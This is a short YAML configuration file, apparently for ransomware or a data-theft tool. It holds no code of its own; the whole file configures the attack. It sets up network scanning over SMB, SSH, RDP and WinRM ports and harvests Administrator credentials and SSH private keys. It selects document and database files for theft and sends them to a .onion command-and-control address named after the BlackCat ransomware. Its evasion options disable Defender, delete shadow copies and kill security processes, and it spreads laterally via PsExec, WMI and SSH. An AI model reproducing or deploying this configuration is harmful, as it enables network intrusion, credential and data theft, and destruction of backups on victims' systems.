# config.yaml
network:
  subnet: "192.168.1.0/24"
  ports: [445, 22, 3389, 5985, 5986]
  
credentials:
  windows:
    - username: "Administrator"
      domain: "WORKGROUP"
  linux:
    ssh_key_paths:
      - "/root/.ssh/id_rsa"
      - "/home/*/.ssh/id_rsa"
      
targets:
  extensions: [".pdf", ".docx", ".xlsx", ".txt", ".sql", ".db", ".jpg", ".png"]
  min_size: 1024  # 1KB
  max_size: 104857600  # 100MB
  
exfiltration:
  c2_server: "http://blackcat-site.onion/exfil"
  encrypt_before_exfil: true
  chunk_size: 1048576  # 1MB
  
evasion:
  disable_defender: true
  delete_shadows: true
  kill_security_processes: true
  sleep_between_ops: 5000  # 5 seconds
  
propagation:
  max_hops: 3
  use_psexec: true
  use_wmi: true
  use_ssh: true